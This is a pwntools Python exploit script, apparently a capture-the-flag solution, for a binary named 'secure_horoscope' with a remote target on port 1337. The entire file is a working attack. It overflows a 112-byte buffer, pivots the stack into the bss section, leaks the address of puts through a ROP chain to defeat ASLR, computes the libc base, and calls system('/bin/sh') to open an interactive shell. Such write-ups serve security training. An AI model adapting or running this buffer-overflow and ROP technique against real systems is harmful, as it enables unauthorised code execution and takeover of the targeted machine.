from pwn import *;

if args.EXPLOIT:
    io = remote("sechoroscope.sdc.tf", 1337);
    libc = ELF("libc.so.6");
else:
    io = process("./secure_horoscope");
    libc = ELF("libc.so.6.test");

file = ELF("./secure_horoscope");

main      = 0x4006c7;
rop_chain = 0x601080 + 3800;
buf_len   = 0x70;
get_info  = 0x4007b1;
get_info_skip_prolouge = 0x4007b5;
get_info_epilouge = 0x40080d;

pop_rdi   = 0x400873;
puts      = 0x4007f8;

# payload to output dynamic address of puts
attack =  p64(pop_rdi);
attack += p64(file.got['puts']);
attack += p64(file.plt['puts']);
attack += p64(main);

io.recv();
io.send(b'\n');
io.recv();

# overwrites rsp with pointer to binary bss section
payload =  b''.ljust(112, b'0');
payload += p64(rop_chain + buf_len);
payload += p64(get_info_skip_prolouge);
io.send(payload);
io.recv();

# calls the attack payload
payload =  attack.ljust(112, b'0');
payload += p64(rop_chain-8);
payload += p64(get_info_epilouge);
io.send(payload);
io.recvuntil(b'days.\n');

# uses the dynamic puts address to calculate libc address
leak = io.recv(6);
print(b'LEAKED BYTES equ ' + leak);
leak = u64(leak + b'\x00\x00');
libc.address = leak - libc.symbols['puts'];

print("LIBC ADDRESS equ " + hex(libc.address));

io.recv();
io.send(b'arrrrghghsldkjfa\n');
io.recv();

# setting the rop_chain address to the libc bss section
if args.EXPLOIT:
    rop_chain = libc.address + 0x3ec860  + 0x2000;
else:
    rop_chain = libc.address + 0x1ed620  + 0x2000;

# payload to obtain shell
shell =  p64(pop_rdi);
shell += p64(rop_chain + 64);
shell += p64(leak + (libc.symbols['system'] - libc.symbols['puts']));
shell += p64(main);

# overwrites rsp with pointer to libc bss section
payload =  b''.ljust(112, b'0');
payload += p64(rop_chain + buf_len);
payload += p64(get_info_skip_prolouge);
io.send(payload);
io.recv();

# calls the attack payload
payload =  (shell.ljust(64, b'0') + b'/bin/sh\x00').ljust(112, b'0');
payload += p64(rop_chain-8);
payload += p64(get_info_epilouge);
io.send(payload);

io.interactive();